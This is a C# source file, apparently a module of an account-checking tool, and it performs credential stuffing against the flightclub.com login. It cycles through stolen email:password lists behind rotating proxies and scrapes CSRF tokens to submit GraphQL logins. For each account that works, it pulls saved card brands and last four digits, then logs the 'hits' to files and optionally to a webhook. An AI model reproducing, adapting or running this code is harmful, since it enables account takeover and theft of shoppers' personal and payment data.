using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class Flightclubmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var getcsrf = req.Get("https://www.flightclub.com/customer/account/login").ToString();
                            var csrf = Parse(getcsrf, "\"csrf\":\"", "\"");
                            req.AddHeader("x-csrf-token", csrf);
                            var str = "{\"operationName\":\"LoginUser\",\"variables\":{\"input\":{\"email\":\"" +
                                      array[0] + "\",\"password\":\"" + array[1] +
                                      "\"}},\"query\":\"mutation LoginUser($input: LoginInput!) {  login(input: $input) {    id    fullName    email    __typename  }}\"}";
                            var strResponse = req.Post("https://www.flightclub.com/graphql", str, "application/json")
                                .ToString();
                            {
                                if (strResponse.Contains("Email or password not correct"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("fullName")) //hit
                                {
                                    req.ClearAllHeaders();
                                    req.AddHeader("x-csrf-token", csrf);
                                    var cappost =
                                        "{\"operationName\":\"getAccount\",\"variables\":{},\"query\":\"query getAccount {  user {    ...AccountPanelUser    __typename  }  shippingAddresses {    ...ShippingAddressPanelAddress    __typename  }  billingAddresses {    ...BillingAddressPanelAddress    __typename  }  creditCards {    ...PaymentPanelCreditCard    __typename  }}fragment AccountPanelUser on User {  id  fullName  email  __typename}fragment ShippingAddressPanelAddress on Address {  name  address1  address2  city  state  postalCode  country  phone {    display    __typename  }  __typename}fragment BillingAddressPanelAddress on Address {  name  address1  address2  city  state  postalCode  country  phone {    display    __typename  }  __typename}fragment PaymentPanelCreditCard on CreditCard {  last4Digits  cardBrand  __typename}\"}";
                                    var cap = req.Post("https://www.flightclub.com/graphql", cappost,
                                        "application/json").ToString();
                                    if (cap.Contains("creditCards\":[]"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Flightclub", array[0] + ":" + array[1]);
                                        Export.AsResult("/Flightclub_frees", array[0] + ":" + array[1]);
                                    }
                                    else
                                    {
                                        var type = Regex.Match(cap, "cardBrand\":(.*?),").Groups[1].Value;
                                        var last4 = Regex.Match(cap, "last4Digits\":(.*?),").Groups[1].Value;
                                        var captures = " | Payment Type: " + type + " | Last 4: " + last4;
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Flightclub",
                                                array[0] + ":" + array[1] + " | " + capture);
                                        Export.AsResult("/Flightclub_hits", array[0] + ":" + array[1] + captures);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + capture,
                                                "Flightclub hits");
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        public static IEnumerable<string> JSON(string input, string field, bool recursive = false,
            bool useJToken = false)
        {
            var list = new List<string>();

            if (useJToken)
            {
                if (recursive)
                {
                    if (input.Trim().StartsWith("["))
                    {
                        var json = JArray.Parse(input);
                        var jsonlist = json.SelectTokens(field, false);
                        foreach (var j in jsonlist)
                            list.Add(j.ToString());
                    }
                    else
                    {
                        var json = JObject.Parse(input);
                        var jsonlist = json.SelectTokens(field, false);
                        foreach (var j in jsonlist)
                            list.Add(j.ToString());
                    }
                }
                else
                {
                    if (input.Trim().StartsWith("["))
                    {
                        var json = JArray.Parse(input);
                        list.Add(json.SelectToken(field, false).ToString());
                    }
                    else
                    {
                        var json = JObject.Parse(input);
                        list.Add(json.SelectToken(field, false).ToString());
                    }
                }
            }
            else
            {
                var jsonlist = new List<KeyValuePair<string, string>>();
                parseJSON("", input, jsonlist);
                foreach (var j in jsonlist)
                    if (j.Key == field)
                        list.Add(j.Value);

                if (!recursive && list.Count > 1) list = new List<string> {list.First()};
            }

            return list;
        }

        private static void parseJSON(string A, string B, List<KeyValuePair<string, string>> jsonlist)
        {
            jsonlist.Add(new KeyValuePair<string, string>(A, B));

            if (B.StartsWith("["))
            {
                JArray arr = null;
                try
                {
                    arr = JArray.Parse(B);
                }
                catch
                {
                    return;
                }

                foreach (var i in arr.Children())
                    parseJSON("", i.ToString(), jsonlist);
            }

            if (B.Contains("{"))
            {
                JObject obj = null;
                try
                {
                    obj = JObject.Parse(B);
                }
                catch
                {
                    return;
                }

                foreach (var o in obj)
                    parseJSON(o.Key, o.Value.ToString(), jsonlist);
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}